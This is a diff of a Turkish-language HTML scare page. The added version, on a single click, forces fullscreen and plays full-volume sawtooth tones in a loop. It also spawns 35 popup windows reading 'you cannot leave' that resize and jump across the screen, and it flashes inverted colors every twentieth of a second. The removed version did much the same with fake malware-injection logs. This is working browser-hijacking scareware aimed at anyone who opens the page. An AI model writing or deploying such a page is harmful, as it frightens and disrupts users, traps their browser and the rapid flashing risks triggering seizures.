@@ -2,168 +2,141 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>S E N İ . B U L D U M</title>
+    <title>G E Ç . M İ Ş . O L S U N</title>
     <style>
         * { cursor: none !important; margin: 0; padding: 0; }
         body {
-            background-color: #000;
-            color: #400;
+            background: #000;
+            color: #ff0000;
             font-family: 'Courier New', monospace;
             overflow: hidden;
             height: 100vh;
-            width: 100vw;
         }
 
-        /* Video Katmanı (Gritli ve bozuk) */
-        #v {
+        /* Bozucu arka plan videosu */
+        #noise {
             position: fixed;
-            top: 0; left: 0;
             width: 100%; height: 100%;
-            object-fit: cover;
-            opacity: 0.15;
+            opacity: 0.3;
             z-index: -1;
-            filter: contrast(300%) grayscale(1);
+            filter: invert(1) contrast(500%);
         }
 
-        /* Glitch Efektli Yazı */
-        .scary-text {
-            position: absolute;
-            font-weight: bold;
-            text-transform: uppercase;
-            pointer-events: none;
-            z-index: 10;
-        }
-
-        #center-msg {
+        #warning {
             position: absolute;
             top: 50%; left: 50%;
             transform: translate(-50%, -50%);
-            font-size: 5vw;
-            color: #f00;
-            text-shadow: 0 0 20px #f00;
-            animation: pulse 0.1s infinite;
+            font-size: 8vw;
+            text-align: center;
+            animation: flash 0.05s infinite;
         }
 
-        @keyframes pulse {
-            0% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
-            50% { transform: translate(-52%, -48%) scale(1.05); opacity: 0.7; }
-            100% { transform: translate(-49%, -51%) scale(1); opacity: 1; }
+        @keyframes flash {
+            0% { opacity: 1; color: #ff0000; transform: translate(-50%, -50%) scale(1); }
+            50% { opacity: 0; color: #fff; transform: translate(-51%, -49%) scale(1.1); }
+            100% { opacity: 1; color: #ff0000; transform: translate(-50%, -50%) scale(1); }
         }
 
-        /* Sahte Hata Mesajları */
-        .error-log {
+        .blood {
             position: fixed;
-            bottom: 10px; left: 10px;
-            font-size: 10px; color: #0f0;
-            opacity: 0.5;
-        }
-
-        /* Takip Eden Kırmızı Boşluk */
-        #stalker {
-            position: fixed;
-            width: 100vw; height: 100vh;
-            background: radial-gradient(circle at center, transparent 10%, black 30%);
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(to bottom, rgba(150,0,0,0.5), transparent);
             pointer-events: none;
-            z-index: 100;
+            z-index: 1000;
         }
     </style>
 </head>
-<body onclick="initTerror()">
+<body onclick="launchNightmare()">
 
-    <div id="stalker"></div>
-    <video id="v" loop muted playsinline>
-        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
-    </video>
+<div class="blood"></div>
+<video id="noise" autoplay loop muted>
+    <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+</video>
+<div id="warning">T I K L A</div>
 
-    <div id="center-msg">T I K L A</div>
-    <div class="error-log" id="logs">SYSTEM_FAILURE: RECOVERY_IMPOSSIBLE...</div>
+<script>
+    let audioCtx;
+    const sites = [
+        "https://www.google.com/search?q=0101010101",
+        "https://www.google.com/search?q=RUN+AWAY",
+        "https://www.google.com/search?q=HELP+ME",
+        "about:blank"
+    ];
 
-    <script>
-        let audioCtx;
-        const phrases = ["ARKANDA", "01101", "RUHUNU VER", "YARDIM ET", "GÖRÜYORUM", "KAPIYI KİLİTLE", "DIŞARI BAKMA", "ÖLECEKSİN"];
-        const weirdURLs = [
-            "https://www.google.com/search?q=cehennemin+kapıları",
-            "https://www.google.com/search?q=how+to+stop+hallucinations",
-            "https://www.google.com/search?q=arkamdaki+kim",
-            "https://shadyurl.com"
-        ];
+    function launchNightmare() {
+        // 1. Tam Ekran ve Ses Hazırlığı
+        if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
+        document.getElementById('warning').innerHTML = "S E N İ N L E Y İ Z";
+        
+        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        maxVolumeScream();
 
-        function initTerror() {
-            // Tam Ekran Yap
-            if (document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen();
-            }
-
-            document.getElementById('center-msg').innerText = "K A Ç A M A Z S I N";
-            document.getElementById('v').play();
-            
-            // Korkutucu Ses Sentezi (Deep Drone)
-            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-            playCreepySound();
-
-            // Kaos Döngüsü
-            setInterval(createGlitchText, 150);
-            setInterval(openWeirdTabs, 2000);
-            setInterval(shakeScreen, 50);
+        // 2. 30'dan Fazla Sekme ve Pencere Saldırısı
+        for (let i = 0; i < 35; i++) {
+            setTimeout(() => {
+                let win = spawnWindow();
+                if (win) manipulateWindow(win);
+            }, i * 150);
         }
 
-        // Fare Takibi
-        document.addEventListener('mousemove', (e) => {
-            const stalker = document.getElementById('stalker');
-            stalker.style.background = `radial-gradient(circle at ${e.clientX}px ${e.clientY}px, transparent 0%, black 20%)`;
-        });
+        // 3. Ekran ve Renk Bozulmaları
+        setInterval(() => {
+            document.body.style.filter = `hue-rotate(${Math.random() * 360}deg) invert(1)`;
+        }, 100);
+    }
 
-        // Rastgele Garif Yazılar
-        function createGlitchText() {
-            const div = document.createElement('div');
-            div.className = 'scary-text';
-            div.style.left = Math.random() * 100 + 'vw';
-            div.style.top = Math.random() * 100 + 'vh';
-            div.style.fontSize = Math.random() * 40 + 10 + 'px';
-            div.style.color = Math.random() > 0.5 ? '#f00' : '#200';
-            div.innerText = phrases[Math.floor(Math.random() * phrases.length)];
-            document.body.appendChild(div);
-            
-            setTimeout(() => div.remove(), 1000);
-            
-            // Log güncelleme
-            document.getElementById('logs').innerText += "\nInjecting_Malware_Block_" + Math.random().toString(16);
+    function spawnWindow() {
+        const w = 200, h = 200;
+        const x = Math.random() * window.screen.width;
+        const y = Math.random() * window.screen.height;
+        const target = sites[Math.floor(Math.random() * sites.length)];
+        
+        const win = window.open(target, "_blank", `width=${w},height=${h},left=${x},top=${y},menubar=no,status=no`);
+        
+        if (win) {
+            win.document.write("<body style='background:red; color:white; overflow:hidden;'><h1>GİDEMEZSİN</h1></body>");
         }
+        return win;
+    }
 
-        // Pencereleri Farklı Yerlere Atma
-        function openWeirdTabs() {
-            const w = 300, h = 300;
-            const x = Math.random() * window.screen.width;
-            const y = Math.random() * window.screen.height;
-            const win = window.open(weirdURLs[Math.floor(Math.random() * weirdURLs.length)], "_blank", `width=${w},height=${h},left=${x},top=${y}`);
+    // Pencereleri Büyütüp Küçülten ve Zıplatan Fonksiyon
+    function manipulateWindow(w) {
+        let grow = true;
+        let size = 200;
+        setInterval(() => {
+            if (!w || w.closed) return;
             
-            if(win) setTimeout(() => win.close(), 4000);
-        }
+            // Boyut değiştirme
+            size = grow ? size + 20 : size - 20;
+            if (size > 500 || size < 100) grow = !grow;
+            w.resizeTo(size, size);
+            
+            // Rastgele konuma fırlatma
+            w.moveTo(Math.random() * window.screen.width, Math.random() * window.screen.height);
+        }, 100);
+    }
 
-        // Rahatsız Edici Ses Üretici (Oscillator)
-        function playCreepySound() {
+    // Maksimum Desibel Kulak Tırmalayıcı Ses (White Noise + Sawtooth)
+    function maxVolumeScream() {
+        const duration = 2; // Saniye bazlı döngü
+        setInterval(() => {
             const osc = audioCtx.createOscillator();
             const gain = audioCtx.createGain();
+
+            osc.type = 'sawtooth'; // En keskin ve rahatsız edici dalga tipi
+            osc.frequency.setValueAtTime(200 + Math.random() * 2000, audioCtx.currentTime);
             
-            osc.type = 'sawtooth';
-            osc.frequency.setValueAtTime(40 + Math.random() * 60, audioCtx.currentTime); // Çok pes ses
-            
-            gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
-            
+            // %100 Desibel (Gain = 1.0 tam kapasitedir)
+            gain.gain.setValueAtTime(1.0, audioCtx.currentTime); 
+            gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.5);
+
             osc.connect(gain);
             gain.connect(audioCtx.destination);
-            
-            osc.start();
-            
-            // Ses perdesini sürekli değiştir
-            setInterval(() => {
-                osc.frequency.exponentialRampToValueAtTime(30 + Math.random() * 100, audioCtx.currentTime + 0.5);
-            }, 500);
-        }
 
-        function shakeScreen() {
-            document.body.style.transform = `translate(${Math.random()*10-5}px, ${Math.random()*10-5}px)`;
-        }
-    </script>
+            osc.start();
+            osc.stop(audioCtx.currentTime + 0.5);
+        }, 200);
+    }
+</script>
 </body>
 </html>
